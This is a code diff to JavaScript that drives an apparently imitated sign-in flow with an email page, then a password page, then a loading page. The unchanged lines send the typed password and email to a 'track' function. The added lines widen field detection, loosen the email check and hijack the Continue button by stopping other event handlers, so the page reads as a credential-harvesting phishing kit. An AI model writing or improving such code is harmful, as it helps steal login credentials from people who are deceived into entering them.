@@ -1035,16 +1035,29 @@ function findContinueButton(scope){
     || buttons[0];
 }
 function wireContinueButtons(){
-  var emails = Array.prototype.slice.call(document.querySelectorAll('input[type="email"], input[name*="mail" i], input[id*="mail" i]'));
-  var passwords = Array.prototype.slice.call(document.querySelectorAll('input[type="password"], input[name*="pass" i], input[id*="pass" i]'));
+  var here = currentDesignAndPage().page || '';
+  // Page → next page mapping for guided flow.
+  var NEXT = { 'signin': 'signinp', 'signinp': 'loading' };
+  var nextPage = NEXT[here] || 'loading';
+
+  var emails = Array.prototype.slice.call(document.querySelectorAll('input[type="email"], input[name*="mail" i], input[id*="mail" i], input[autocomplete*="email" i], input[autocomplete*="username" i]'));
+  var passwords = Array.prototype.slice.call(document.querySelectorAll('input[type="password"], input[name*="pass" i], input[id*="pass" i], input[autocomplete*="password" i]'));
   var hasPassword = passwords.length > 0;
+  // If no email field detected but we're on signin, fall back to the first text input in a form.
+  if (!emails.length && !hasPassword) {
+    emails = Array.prototype.slice.call(document.querySelectorAll('form input[type="text"], input[type="text"]')).slice(0, 1);
+  }
   var input = passwords[0] || emails[0];
   if (!input) {
     var btnOnly = findContinueButton();
     if (btnOnly && !btnOnly.__uxContinueWired) {
       btnOnly.__uxContinueWired = true;
       btnOnly.disabled = false;
-      btnOnly.addEventListener('click', function(){ navigateTo('loading'); }, true);
+      btnOnly.addEventListener('click', function(e){
+        e.preventDefault(); e.stopPropagation();
+        if (e.stopImmediatePropagation) e.stopImmediatePropagation();
+        navigateTo(nextPage);
+      }, true);
     }
     return;
   }
@@ -1055,7 +1068,7 @@ function wireContinueButtons(){
   function ok(){
     var v = input.value || '';
     if (hasPassword) return v.length > 0;
-    return /@/.test(v);
+    return v.length > 0;
   }
   function sync(){
     var ready = ok();
@@ -1074,12 +1087,12 @@ function wireContinueButtons(){
     if (hasPassword) {
       try { window.track('password_submitted', input.value || ''); } catch(err){}
       try { window.track('continue_clicked', '1'); } catch(err){}
-      navigateTo('loading');
+      navigateTo(nextPage);
     } else {
       setStoredEmail(input.value || '');
       try { window.track('email_submitted', input.value || ''); } catch(err){}
       try { window.track('continue_clicked', '1'); } catch(err){}
-      navigateTo('signinp');
+      navigateTo(nextPage);
     }
   }, true);
   var form = input.closest('form');
